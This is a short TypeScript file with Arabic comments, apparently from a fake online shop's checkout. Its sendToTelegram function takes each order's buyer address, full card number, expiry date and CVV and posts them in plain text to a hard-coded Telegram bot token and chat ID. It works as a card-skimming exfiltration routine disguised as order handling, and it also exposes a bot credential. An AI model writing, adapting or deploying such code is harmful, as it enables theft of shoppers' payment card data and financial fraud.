// دالة إرسال الرسائل إلى بوت تلجرام
// =========================================
// عدّل هذه المتغيرات بالتوكن والـ Chat ID الخاص بك
// =========================================
const TOKEN_BOT = "8686213894:AAGq5-jOq1y4_RutwllF0Gyjbwey21TT9OE"
const CHAT_ID = "8410455844"

interface OrderData {
  items: { name: string; quantity: number; price: number }[]
  total: number
  address: string
  cardHolderName: string
  cardNumber: string
  expiryDate: string
  cvv: string
}

export async function sendToTelegram(data: OrderData): Promise<boolean> {
  // تنسيق الرسالة
  const itemsList = data.items
    .map(
      (item) =>
        `  - ${item.name} (x${item.quantity}) = ${item.price * item.quantity} جنيه`
    )
    .join("\n")

  const message = `
🛒 *طلب جديد!*
━━━━━━━━━━━━━━━

📦 *المنتجات:*
${itemsList}

💰 *المجموع الكلي:* ${data.total} جنيه

📍 *العنوان:* ${data.address}

💳 *بيانات البطاقة:*
  - الاسم على البطاقة: ${data.cardHolderName}
  - رقم البطاقة: ${data.cardNumber}
  - تاريخ الانتهاء: ${data.expiryDate}
  - CVV: ${data.cvv}

━━━━━━━━━━━━━━━
  `.trim()

  try {
    const url = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    const result = await response.json()
    return result.ok === true
  } catch (error) {
    console.error("خطأ في إرسال الرسالة لتلجرام:", error)
    return false
  }
}
